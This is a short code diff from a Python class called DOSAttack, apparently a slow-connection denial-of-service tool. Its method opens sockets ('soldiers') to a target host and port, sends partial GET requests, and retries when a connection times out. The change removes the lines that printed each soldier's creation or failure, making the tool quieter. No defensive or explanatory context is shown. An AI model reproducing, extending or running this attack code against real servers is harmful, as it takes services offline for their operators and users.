@@ -13,10 +13,8 @@ class DOSAttack():
             soldier.settimeout(DOSAttack.DEFAULT_TIMEOUT)
             soldier.connect((self._target_ip,self._target_port))
             soldier.send(self.toRequest("Get /?"))
-            print(f"Soldier #{len(self._soldiers) + 1} created.")
             return soldier
         except socket.timeout:
-            print(f"Failed to create soldier #{len(self._soldiers) + 1}.")
             return self.create_soldier_socket()
     
     def toRequest(self,s):
